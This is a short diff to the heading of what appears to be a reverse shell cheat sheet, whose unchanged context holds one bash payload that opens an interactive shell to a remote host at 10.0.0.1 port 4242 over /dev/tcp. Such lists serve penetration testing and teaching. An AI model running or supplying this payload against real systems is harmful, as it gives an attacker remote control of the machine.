@@ -1,6 +1,13 @@
-# Reverse Shell [Cheat Sheet]
+<h1 align="center">Reverse Shell</h1>
 
-## Bourne-Again Shell
+<br />
+
+<div align="center">
+  <strong>All Payloads, Different Methods</strong>
+</div>
+
+<br />
+
 ### Transmission Control Protocol | Remote Host
 ```
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
